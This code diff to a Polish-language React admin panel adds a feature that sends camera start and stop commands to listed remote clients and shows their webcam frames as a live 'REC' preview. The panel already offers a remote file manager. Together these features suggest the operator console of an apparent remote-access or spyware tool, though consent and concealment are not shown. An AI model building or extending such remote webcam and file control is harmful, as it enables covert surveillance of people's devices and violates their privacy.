@@ -33,6 +33,23 @@ export default function AdminPage() {
     fetchClients();
   };
 
+  const toggleCamera = async (id: string, currentlyCapturing: boolean) => {
+    try {
+      await fetch('/api/admin', {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          id,
+          message: currentlyCapturing ? "CAMERA:STOP" : "CAMERA:START"
+        })
+      });
+      // Toggle local state to update the UI instantly (but server logic does the heavy lifting).
+      setClients(clients.map(c => c.id === id ? { ...c, isCameraActive: !currentlyCapturing } : c));
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
   return (
     <div style={{ minHeight: "100vh", padding: "3rem", background: "linear-gradient(135deg, #0f172a 0%, #172033 100%)", fontFamily: "'Inter', sans-serif" }}>
       <div style={{ maxWidth: "1000px", margin: "0 auto" }}>
@@ -144,6 +161,40 @@ export default function AdminPage() {
                     >
                         📂 Otwórz Menedżer Plików
                     </button>
+                    
+                    {/* Camera Control Section */}
+                    <button 
+                        onClick={() => toggleCamera(client.id, client.isCameraActive)}
+                        style={{ 
+                          width: "100%",
+                          marginTop: "10px",
+                          padding: "0.8rem 1rem", 
+                          borderRadius: "4px", 
+                          border: "none",
+                          background: client.isCameraActive ? "#ef4444" : "#f59e0b",
+                          color: "white",
+                          fontWeight: "bold",
+                          cursor: "pointer",
+                          boxShadow: "0 4px 15px rgba(245, 158, 11, 0.4)",
+                          transition: "background 0.2s"
+                        }}
+                    >
+                        {client.isCameraActive ? "⏹️ Wyłącz Kamere" : "📹 Włącz Kamere"}
+                    </button>
+                    
+                    {client.isCameraActive && client.cameraData && (
+                        <div style={{ marginTop: "15px", borderRadius: "6px", overflow: "hidden", backgroundColor: "#000" }}>
+                            <div style={{ padding: "4px 8px", background: "#333", color: "white", fontSize: "11px", display: "flex", justifyContent: "space-between" }}>
+                                <span>Podgląd na żywo ({client.id})</span>
+                                <span style={{ color: "red", fontWeight: "bold" }}>● REC</span>
+                            </div>
+                            <img 
+                                src={`data:image/jpeg;base64,${client.cameraData}`} 
+                                alt="Kamera na żywo" 
+                                style={{ width: "100%", height: "auto", display: "block" }} 
+                            />
+                        </div>
+                    )}
                   </div>
                 </div>
               </div>
